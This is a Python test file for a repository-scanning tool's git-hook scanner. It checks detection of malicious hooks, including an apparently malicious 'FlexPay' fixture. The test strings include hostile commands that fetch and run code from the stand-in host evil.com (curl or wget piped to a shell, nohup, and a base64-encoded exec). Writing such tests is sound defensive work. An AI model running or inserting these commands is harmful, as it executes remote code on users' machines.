"""
Tests for hook_scanner module — Module 2.

FlexPay fixture loaded from disk. Clean repo fixture loaded from disk.
No network calls.
"""

import os
from unittest.mock import Mock, patch

from repo_guard.models import Severity
from repo_guard.modules.hook_scanner import scan, _calculate_comment_ratio

# Paths to test fixtures.
FIXTURES_DIR = os.path.join(os.path.dirname(__file__), "fixtures")
FLEXPAY_DIR = os.path.join(FIXTURES_DIR, "flexpay_mock")
CLEAN_DIR = os.path.join(FIXTURES_DIR, "clean_repo")


def _load_fixture_file(relative_path: str, base_dir: str = FLEXPAY_DIR) -> str:
    """Load a fixture file from disk and return its content."""
    file_path = os.path.join(base_dir, relative_path)
    with open(file_path, "r") as f:
        return f.read()


# ---------------------------------------------------------------------------
# Comment ratio helper
# ---------------------------------------------------------------------------


class TestCalculateCommentRatio:
    """Verify the comment-to-code ratio calculation."""

    def test_all_comments(self):
        content = "# comment 1\n# comment 2\n# comment 3\n"
        assert _calculate_comment_ratio(content) == 1.0

    def test_no_comments(self):
        content = "echo hello\ncurl example.com\n"
        assert _calculate_comment_ratio(content) == 0.0

    def test_mixed(self):
        content = "# comment\necho hello\n# another comment\ncurl example.com\n"
        assert _calculate_comment_ratio(content) == 0.5

    def test_empty_content(self):
        assert _calculate_comment_ratio("") == 0.0

    def test_only_whitespace(self):
        assert _calculate_comment_ratio("  \n  \n") == 0.0


# ---------------------------------------------------------------------------
# Hook scanner with FlexPay fixture
# ---------------------------------------------------------------------------


class TestHookScannerFlexPay:
    """The FlexPay fixture is the canary — must trigger CRITICAL/WARNING."""

    def test_flexpay_hook_detects_execution_patterns(self):
        flexpay_hook = _load_fixture_file(".githooks/post-checkout")
        mock_tree = [
            {"path": ".githooks/post-checkout", "type": "blob", "sha": "abc", "size": 500},
        ]

        client = Mock()
        client.get_tree.return_value = mock_tree
        client.get_file_content.return_value = flexpay_hook

        result = scan(client, "flexpay", "repo")
        assert result.module_name == "hook_scanner"
        assert result.severity in (Severity.WARNING, Severity.CRITICAL)

        # Should find critical execution patterns.
        critical_findings = [f for f in result.findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) >= 1, (
            f"Expected at least 1 CRITICAL finding, got: {critical_findings}"
        )

    def test_flexpay_hook_finds_network_command(self):
        flexpay_hook = _load_fixture_file(".githooks/post-checkout")
        mock_tree = [
            {"path": ".githooks/post-checkout", "type": "blob", "sha": "abc", "size": 500},
        ]

        client = Mock()
        client.get_tree.return_value = mock_tree
        client.get_file_content.return_value = flexpay_hook

        result = scan(client, "flexpay", "repo")
        network_findings = [f for f in result.findings if "Network command" in f.message]
        assert len(network_findings) >= 1

    def test_flexpay_hook_detects_base64_payload(self):
        flexpay_hook = _load_fixture_file(".githooks/post-checkout")
        mock_tree = [
            {"path": ".githooks/post-checkout", "type": "blob", "sha": "abc", "size": 500},
        ]

        client = Mock()
        client.get_tree.return_value = mock_tree
        client.get_file_content.return_value = flexpay_hook

        result = scan(client, "flexpay", "repo")
        b64_findings = [f for f in result.findings if "Base64" in f.message]
        assert len(b64_findings) >= 1

    def test_flexpay_hook_comment_ratio_flagged(self):
        """FlexPay's ~84% decoy comments + network command should trigger 70% ratio heuristic."""
        flexpay_hook = _load_fixture_file(".githooks/post-checkout")
        ratio = _calculate_comment_ratio(flexpay_hook)
        assert ratio > 0.7, f"Expected ratio > 0.7 for FlexPay fixture, got {ratio}"

        mock_tree = [
            {"path": ".githooks/post-checkout", "type": "blob", "sha": "abc", "size": 500},
        ]

        client = Mock()
        client.get_tree.return_value = mock_tree
        client.get_file_content.return_value = flexpay_hook

        result = scan(client, "flexpay", "repo")
        ratio_findings = [f for f in result.findings if "comment-to-code" in f.message.lower()]
        assert len(ratio_findings) >= 1, (
            f"Expected at least 1 comment-ratio finding, got: {ratio_findings}"
        )
        assert "84%" in ratio_findings[0].message or "85%" in ratio_findings[0].message, (
            f"Ratio finding message should reference the percentage: {ratio_findings[0].message}"
        )


# ---------------------------------------------------------------------------
# Hook scanner with clean repo fixture
# ---------------------------------------------------------------------------


class TestHookScannerClean:
    """The clean repo fixture should return CLEAN (no .githooks/ directory)."""

    def test_no_githooks_directory_returns_clean(self):
        """When there's no .githooks/ in the tree, return CLEAN."""
        client = Mock()
        client.get_tree.return_value = [
            {"path": "README.md", "type": "blob", "sha": "abc", "size": 50},
            {"path": "src/main.py", "type": "blob", "sha": "def", "size": 100},
        ]

        result = scan(client, "owner", "clean-repo")
        assert result.severity == Severity.CLEAN
        finding_messages = [f.message for f in result.findings]
        assert any("No .githooks directory" in m for m in finding_messages)

    def test_tree_fetch_failure_returns_info(self):
        """If the tree fetch fails, return INFO, not a crash."""
        client = Mock()
        client.get_tree.side_effect = Exception("API error")

        result = scan(client, "owner", "repo")
        assert result.severity == Severity.INFO
        assert len(result.findings) >= 1
        assert "Could not fetch" in result.findings[0].message


# ---------------------------------------------------------------------------
# Individual pattern tests
# ---------------------------------------------------------------------------


class TestHookScannerPatterns:
    """Test individual execution pattern detection."""

    def test_curl_piped_to_bash_detected(self):
        content = "curl -s https://evil.com/init.sh | bash"
        mock_tree = [{"path": ".githooks/pre-commit", "type": "blob", "sha": "abc", "size": 100}]
        client = Mock()
        client.get_tree.return_value = mock_tree
        client.get_file_content.return_value = content
        result = scan(client, "o", "r")
        critical = [f for f in result.findings if f.severity == Severity.CRITICAL]
        assert any("piped to shell" in f.message for f in critical)

    def test_wget_piped_to_sh_detected(self):
        content = 'wget -qO- "http://evil.com/payload" | sh'
        mock_tree = [{"path": ".githooks/post-merge", "type": "blob", "sha": "abc", "size": 100}]
        client = Mock()
        client.get_tree.return_value = mock_tree
        client.get_file_content.return_value = content
        result = scan(client, "o", "r")
        critical = [f for f in result.findings if f.severity == Severity.CRITICAL]
        assert any("piped to shell" in f.message for f in critical)

    def test_output_suppression_detected(self):
        content = "curl evil.com | bash >/dev/null 2>&1"
        mock_tree = [{"path": ".githooks/pre-commit", "type": "blob", "sha": "abc", "size": 100}]
        client = Mock()
        client.get_tree.return_value = mock_tree
        client.get_file_content.return_value = content
        result = scan(client, "o", "r")
        suppression_findings = [f for f in result.findings if "Output suppression" in f.message]
        assert len(suppression_findings) >= 1

    def test_nohup_detected(self):
        content = "nohup python3 -c 'import os; os.system(\"curl evil.com | bash\")' &"
        mock_tree = [{"path": ".githooks/pre-commit", "type": "blob", "sha": "abc", "size": 100}]
        client = Mock()
        client.get_tree.return_value = mock_tree
        client.get_file_content.return_value = content
        result = scan(client, "o", "r")
        nohup_findings = [f for f in result.findings if "nohup" in f.message.lower()]
        assert len(nohup_findings) >= 1

    def test_benign_hook_no_false_positives(self):
        """A normal git hook should not trigger any CRITICAL findings."""
        content = "#!/bin/sh\n# Auto-format on commit\nblack .\n"
        mock_tree = [{"path": ".githooks/pre-commit", "type": "blob", "sha": "abc", "size": 50}]
        client = Mock()
        client.get_tree.return_value = mock_tree
        client.get_file_content.return_value = content
        result = scan(client, "o", "r")
        critical = [f for f in result.findings if f.severity == Severity.CRITICAL]
        assert len(critical) == 0

    def test_base64_payload_detected(self):
        """Base64 string that decodes to a shell command should be flagged."""
        import base64
        payload = 'import os; os.system("curl evil.com | bash")'
        encoded = base64.b64encode(payload.encode()).decode()
        content = f"python3 -c \"exec(base64.b64decode('{encoded}'))\""
        mock_tree = [{"path": ".githooks/pre-commit", "type": "blob", "sha": "abc", "size": 100}]
        client = Mock()
        client.get_tree.return_value = mock_tree
        client.get_file_content.return_value = content
        result = scan(client, "o", "r")
        b64_findings = [f for f in result.findings if "Base64" in f.message]
        assert len(b64_findings) >= 1

    def test_no_hooks_returns_clean_with_note(self):
        """Empty tree (no files at all) should return CLEAN."""
        client = Mock()
        client.get_tree.return_value = []
        result = scan(client, "o", "r")
        assert result.severity == Severity.CLEAN
        assert any("No .githooks directory" in f.message for f in result.findings)
